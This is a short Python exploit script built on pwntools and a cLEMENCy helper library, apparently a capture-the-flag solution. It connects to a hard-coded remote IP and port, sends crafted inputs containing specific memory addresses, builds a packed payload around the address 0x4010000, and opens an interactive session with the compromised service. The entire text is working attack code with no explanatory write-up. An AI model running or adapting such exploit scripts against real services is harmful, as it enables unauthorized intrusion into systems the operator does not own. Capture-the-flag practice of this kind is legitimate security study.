#!/usr/bin/env python
# coding:utf-8

from pwn import *
from clemency import *

io = cyremote('45.79.101.169', 2525)

io.recvuntil('> ')
io.sendline('41')
io.recvuntil('> ')
io.sendline('0x5F91 0xc412 qq') # + -> pop
io.recvuntil('> ')
io.sendline('0x4CA3 0xc442 qq')
io.recvuntil('> ')
t = p27(0x4010000)
x = u27([random.randint(0, 511), random.randint(0, 511), t[0]])
y = u27([t[1], t[2], random.randint(0, 511)])
io.sendline('{} 0x000cb9a qq {} 0x000cb9d qq .'.format(x, y))
# io.sendline('+ -')
# io.recvuntil('invalid:')
# print io.recvline().strip()

io.interactive()
